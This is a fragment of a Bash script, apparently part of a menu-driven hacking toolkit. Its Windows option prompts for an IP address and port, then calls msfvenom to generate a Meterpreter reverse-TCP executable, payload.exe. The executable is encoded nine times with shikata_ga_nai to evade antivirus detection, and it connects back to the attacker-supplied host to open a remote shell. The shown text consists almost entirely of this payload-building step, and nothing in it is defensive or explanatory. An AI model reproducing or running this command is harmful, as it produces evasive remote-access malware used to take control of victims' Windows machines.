...
if [[ $islem == 17 || $islem == 017 ]]; then
clear
read -p "Windows or Android > " select
...
elif [ $select = Windows ]; then
read -p "ip? > " ipw
read -p "port? > " portw
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ipw LPORT=$portw -e x86/shikata_ga_nai -i 9 -f exe -o payload.exe
sleep 1
clear
exit
fi
